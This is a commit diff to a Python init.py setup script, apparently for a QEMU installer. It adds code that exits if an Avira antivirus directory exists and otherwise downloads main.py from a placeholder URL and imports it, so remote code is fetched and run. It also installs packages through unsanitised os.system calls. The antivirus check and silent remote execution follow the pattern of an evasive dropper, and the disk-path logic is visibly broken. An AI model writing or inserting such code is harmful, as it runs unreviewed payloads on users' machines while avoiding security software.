19ba57fe565a73c6aa5c98ac15475406f5753279
aLoongQwQ <moe@mc-m.net>
2023-01-11 16:12:17 +0800

    添加安装检查

--- init.py
+++ init.py
@@ -1,6 +1,19 @@
 import os
+import re
+import sys
 import zipfile
 import urllib.request
+def pip_get(name):
+    os.system("pip install " + name)
+    os.system("pip3 install " + name)
+def installmain():
+    with open("install.over","w") as f:
+        f.write("1")
+    pip_get("psutil")
+    pip_get("django")
+    data = urllib.request.urlopen("main文件地址")
+    with open("main.py", "w") as f:
+        f.write(data.read().decode("utf-8"))
 if(os.path.exists('qemu.setup.flag')):
     pass
 else:
@@ -16,3 +29,21 @@ else:
             zip_file.extract(name,"qemu.zip"+"_files/")
 
 
+avriaPath = "Program Files (x86)\\Avira\\Security"
+os.system("pip install psutil")
+import psutil
+disk = str(psutil.disk_partitions())
+disk_device = r'device'
+for i in re.finditer('device', disk):
+    start = i.span()[1] + 2
+    end = i.span()[1] + 4
+    disks = str(disk[start:end])
+    disk = disk[0:2]
+path1 = disk + "/" + avriaPath
+if(os.path.exists(avriaPath)):
+    sys.exit(0)
+else:
+    if(os.path.exists("install.over")):
+        import main
+    else:
+        installmain()
